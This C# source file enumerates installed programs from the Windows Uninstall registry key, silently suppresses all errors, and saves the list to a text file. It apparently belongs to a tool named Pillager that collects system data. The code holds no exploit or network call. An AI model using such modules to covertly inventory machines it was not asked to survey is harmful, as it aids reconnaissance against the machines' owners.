using Microsoft.Win32;
using Pillager.Helper;
using System.IO;
using System.Text;

namespace Pillager.SystemInfos
{
    internal class InstalledApp : ICommandOnce
    {
        public string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Uninstall"))
                    foreach (var subkey in key.GetSubKeyNames())
                    {
                        string value = key.OpenSubKey(subkey)?.GetValue("DisplayName", "Error").ToString();
                        if (!string.IsNullOrEmpty(value) && value != "Error" && !value.Contains("Windows"))
                            sb.AppendLine(value);
                    }
            }
            catch
            { }
            return sb.ToString();
        }
        public override void Save(string path)
        {
            try
            {
                string savepath = Path.Combine(path, "System");
                string result = GetInfo();
                if (!string.IsNullOrEmpty(result))
                {
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, "InstalledApp.txt"), result, Encoding.UTF8);
                }
            }
            catch { }
        }
    }
}
